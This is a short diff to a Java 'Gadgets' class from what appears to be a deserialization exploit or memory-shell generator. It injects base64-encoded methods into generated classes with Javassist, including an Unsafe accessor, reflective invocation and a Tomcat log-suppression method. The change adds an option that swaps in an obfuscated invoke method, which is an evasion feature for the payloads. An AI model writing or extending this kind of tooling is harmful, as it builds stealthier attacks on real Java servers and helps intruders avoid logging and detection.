@@ -490,7 +490,7 @@ public class Gadgets {
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(TO_CSTRING_Method), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
 			try {
 				ctClass.getDeclaredMethod("getFieldValue");
 			} catch (NotFoundException e) {
@@ -529,7 +529,11 @@ public class Gadgets {
 		try {
 			ctClass.getDeclaredMethod("getMethodAndInvoke");
 		} catch (NotFoundException e) {
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+			if (IS_OBSCURE) {
+				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
+			} else {
+				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+			}
 		}
 
 		ctClass.addMethod(CtMethod.make(base64Decode(TOMCAT_NO_LOG), ctClass));
